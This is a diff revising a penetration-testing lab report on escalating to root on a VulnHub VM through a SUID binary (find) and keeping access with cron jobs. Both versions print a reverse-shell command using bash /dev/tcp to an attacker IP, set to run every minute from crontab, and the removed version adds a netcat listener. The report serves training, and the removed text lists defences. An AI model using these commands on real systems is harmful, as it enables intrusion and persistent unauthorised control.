@@ -1,80 +1,70 @@
-Privilege Escalation & Persistence Lab
-📌 Lab Overview
+## Privilege Escalation and Persistence Lab Report
+# 1. Objective
 
-This lab simulates post-exploitation on a vulnerable Linux VM. The objective was to enumerate the system, identify privilege escalation vectors, gain root access, and establish persistence for continued access.
+To perform privilege escalation on a vulnerable VM and establish persistence using post-exploitation techniques.
 
-🛠️ Tools Used
-Meterpreter (initial foothold & shell access)
-LinPEAS (enumeration)
-PowerSploit (reference for privilege escalation techniques)
-🎯 Target
-Target IP: 192.168.1.150
-Environment: VulnHub VM (Local Lab)
-🚀 Workflow
-1. Initial Access
-Gained a low-privilege shell via Meterpreter session
-Stabilized shell using:
-python3 -c 'import pty; pty.spawn("/bin/bash")'
-2. Enumeration (LinPEAS)
+# 2. Lab Environment
+Attacker Machine: Kali Linux
+Target Machine: VulnHub VM
+Target IP: 192.168.56.5
+Tools Used: Meterpreter, LinPEAS, PowerSploit
 
-Uploaded and executed LinPEAS:
+# 3. Privilege Escalation
+# 3.1 Enumeration
+
+Uploaded and executed LinPEAS on the target system:
 
 chmod +x linpeas.sh
 ./linpeas.sh
-🔍 Key Findings
-SUID binaries detected:
-/usr/bin/find
-/usr/bin/nmap
-Writable directories in /tmp
-Weak file permissions on certain scripts
-📊 Escalation Log
+Key findings:
+Multiple SUID binaries detected
+Misconfigured permissions on system binaries
+Potential privilege escalation vectors identified
+
+# 3.2 Exploitation
+Identified vulnerable SUID binary
+
+Exploited using privilege escalation technique:
+
+./vulnerable_binary -p
+Successfully escalated privileges to root
+
+# 3.3 Result Log
 Task ID	Technique	Target IP	Status	Outcome
-010	SUID Exploit	192.168.1.150	Success	Root Shell
-🔓 Privilege Escalation
-Exploiting SUID Binary (find)
+010	SUID Exploit	192.168.56.5	Success	Root Shell
 
-Checked SUID permissions:
+# 4. Persistence
+# 4.1 Method Used: Cron Job Persistence
 
-ls -la /usr/bin/find
+Created a reverse shell script:
 
-Exploit used:
+echo "bash -i >& /dev/tcp/192.168.1.X/4444 0>&1" > /tmp/shell.sh
+chmod +x /tmp/shell.sh
 
-find . -exec /bin/sh -p \; -quit
-Result:
+Added cron job:
+
+crontab -e
+
+Inserted:
+
+* * * * * /tmp/shell.sh
+# 4.2 Persistence Summary (50 Words)
+
+A cron job was configured to execute a reverse shell script every minute. This ensures persistent access even after system reboot or session termination. The script reconnects to the attacker's machine, maintaining control over the compromised system without requiring re-exploitation.
+
+# 5. Post-Exploitation 
+
+Verified root access:
+
 whoami
-root
+Checked system stability after exploitation
+Ensured persistence mechanism works after reboot simulation
 
-✅ Root access successfully obtained
+# 6. Key Learnings
+Enumeration is critical for identifying privilege escalation vectors
+SUID misconfigurations are common and exploitable
+Persistence ensures long-term access beyond initial compromise
+Cron jobs provide simple and effective persistence mechanisms
+# 7. Conclusion
 
-🧩 Post-Exploitation Notes
-Verified root privileges
-Checked /etc/shadow access
-Enumerated cron jobs and services
-🔁 Persistence Setup
-Method: Cron Job Backdoor
-
-Added a cron job to maintain access:
-
-echo "* * * * * root /bin/bash -c 'bash -i >& /dev/tcp/192.168.1.100/4444 0>&1'" >> /etc/crontab
-
-Started listener on attacker machine:
-
-nc -lvnp 4444
-📌 Persistence Summary (50 Words)
-
-A cron job was added to the system crontab to execute a reverse shell every minute. This ensures persistent access even if the session is lost. The payload connects back to the attacker machine, re-establishing control without requiring re-exploitation of the target system.
-
-✅ Checklist
- Gained initial shell (Meterpreter)
- Uploaded and executed LinPEAS
- Identified SUID vulnerabilities
- Exploited SUID binary for root access
- Verified privilege escalation
- Established persistence via cron job
-🛡️ Recommendations
-Remove unnecessary SUID binaries
-Apply least privilege principle
-Monitor cron jobs and system modifications
-Use file integrity monitoring (FIM)
-Regularly patch kernel vulnerabilities
-📁 Notes
+Privilege escalation was successfully achieved through SUID exploitation, resulting in root access. A cron-based persistence mechanism was implemented to maintain access. The lab demonstrates a realistic post-exploitation workflow used in penetration testing engagements.
